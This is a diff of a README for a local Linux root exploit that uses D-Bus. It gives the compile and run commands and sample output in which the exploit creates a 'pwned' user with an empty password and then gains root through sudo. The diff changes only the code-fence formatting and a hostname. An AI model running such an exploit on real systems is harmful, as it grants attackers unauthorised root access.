@@ -4,17 +4,17 @@ Exploiting boundaries
 ## Steps to run
 
 Compile the exploit
-```
+```Shell
 gcc -Wall exploit.c -o exploit $(pkg-config --libs --cflags dbus-1)
 ```
 
 Run the exploit
-```
+```Shell
 ./exploit
 ```
 
 Output
-```
+```Shell
 ┌──kali㉿kali)-[~]
 └─$ ./exploit
 [*] creating "pwned-1631954041" user ...
@@ -23,7 +23,7 @@ Output
 [*] setting an empty password for "pwned-1631954041" user..
 [*] an empty password has been set for "pwned-1631954041" user!
 [!] run: "sudo su root" as "pwned-1631954041" user to get root
-┌──(pwned-1631954041㉿badmusk)-[/home/kali]
+┌──(pwned-1631954041㉿kali)-[/home/kali]
 └─$ sudo su root
 
 We trust you have received the usual lecture from the local System
